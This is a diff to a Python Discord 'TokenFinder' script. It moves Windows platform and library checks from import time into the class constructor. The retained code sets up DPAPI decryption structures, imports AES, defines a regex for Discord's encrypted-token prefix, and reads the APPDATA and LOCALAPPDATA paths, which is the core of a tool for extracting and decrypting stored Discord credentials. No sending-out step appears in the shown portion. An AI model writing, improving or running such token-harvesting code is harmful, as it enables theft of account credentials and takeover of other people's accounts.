@@ -37,45 +37,31 @@ def pause():
     except:
         pass
 
-# Check if Windows
-if sys.platform != "win32":
-    print(f"""
-╔══════════════════════════════════════════════════════════╗
-║  [ERROR] Windows Required                                ║
-╠══════════════════════════════════════════════════════════╣
-║  Token finder only works on Windows                      ║
-║  Discord stores tokens differently on other platforms    ║
-╚══════════════════════════════════════════════════════════╝""")
-    pause()
-    sys.exit(1)
+# Windows-specific imports (only fail when actually used)
+WINDOWS_AVAILABLE = False
+CRYPTO_AVAILABLE = False
+DATA_BLOB = None
 
-# Windows-specific imports
-try:
-    import ctypes
-    from ctypes import POINTER, Structure, c_buffer, c_char, wintypes
+if sys.platform == "win32":
+    try:
+        import ctypes
+        from ctypes import POINTER, Structure, c_buffer, c_char, wintypes
+        
+        class DATA_BLOB(Structure):
+            _fields_ = [
+                ("cbData", wintypes.DWORD),
+                ("pbData", POINTER(c_char))
+            ]
+        
+        WINDOWS_AVAILABLE = True
+    except ImportError:
+        pass
     
-    class DATA_BLOB(Structure):
-        _fields_ = [
-            ("cbData", wintypes.DWORD),
-            ("pbData", POINTER(c_char))
-        ]
-    
-    WINDOWS_AVAILABLE = True
-    debug_print("Windows ctypes loaded")
-except ImportError as e:
-    print(f"  [ERROR] Failed to import Windows libraries: {e}")
-    WINDOWS_AVAILABLE = False
-    pause()
-    sys.exit(1)
-
-# Try to import Crypto
-try:
-    from Crypto.Cipher import AES
-    CRYPTO_AVAILABLE = True
-    debug_print("pycryptodome loaded")
-except ImportError:
-    print("  [ERROR] pycryptodome not installed - run: pip install pycryptodome")
-    CRYPTO_AVAILABLE = False
+    try:
+        from Crypto.Cipher import AES
+        CRYPTO_AVAILABLE = True
+    except ImportError:
+        pass
 
 
 class TokenFinder:
@@ -96,6 +82,12 @@ class TokenFinder:
     ENCRYPTED_TOKEN_PATTERN = r'dQw4w9WgXcQ:[^.*\[\'(.*)\'\].*$][^"]*'
     
     def __init__(self):
+        # Check platform only when actually using TokenFinder, not at import
+        if sys.platform != "win32":
+            raise RuntimeError("Token finder only works on Windows")
+        if not WINDOWS_AVAILABLE:
+            raise RuntimeError("Windows libraries not available")
+        
         self.tokens = []
         self.roaming = os.getenv("APPDATA")
         self.local = os.getenv("LOCALAPPDATA")
